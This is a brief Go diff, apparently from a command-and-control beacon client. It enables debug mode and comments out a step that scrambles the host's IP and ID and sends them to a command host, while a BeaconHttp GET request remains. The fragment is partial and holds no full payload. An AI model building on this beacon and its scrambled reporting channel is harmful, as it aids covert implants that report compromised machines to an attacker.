@@ -16,7 +16,7 @@ var cmdHost string
 var id string
 var ip string
 var queryData string
-var debug bool = false
+var debug bool = true
 var netClient = &http.Client{
 	Timeout: time.Second * 10,
 }
@@ -40,7 +40,7 @@ func main() {
 	jsonData, err = json.Marshal(CommandUpdate{ip,id,"cooltest123 asd asd",nil})
 	debugFatal(err)
 
-	var ipidEncoder = IPIDEncoder {
+	/*var ipidEncoder = IPIDEncoder {
 		data: jsonData,
 	}
 
@@ -48,7 +48,7 @@ func main() {
 		data: ipidEncoder.scramble(),
 	}
 
-	ipidUpdateRequest.queryServer()
+	ipidUpdateRequest.queryServer()*/
 
 	var serverUpdateRequest = BeaconHttp {
 		method: "GET",
